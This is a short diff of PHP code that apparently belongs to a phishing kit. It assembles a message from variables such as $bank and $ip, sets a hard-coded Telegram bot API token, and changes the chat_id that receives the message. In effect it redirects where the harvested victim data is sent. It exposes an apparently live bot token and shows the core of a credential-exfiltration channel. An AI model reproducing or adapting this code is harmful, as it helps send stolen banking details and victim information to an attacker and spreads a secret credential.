@@ -201,7 +201,7 @@ $message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$bsr$lh$uos\n\n\n[ + 
 
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
-    'chat_id' => '-821080105',
+    'chat_id' => '-903484597',
     'text' => $message
 ];
 
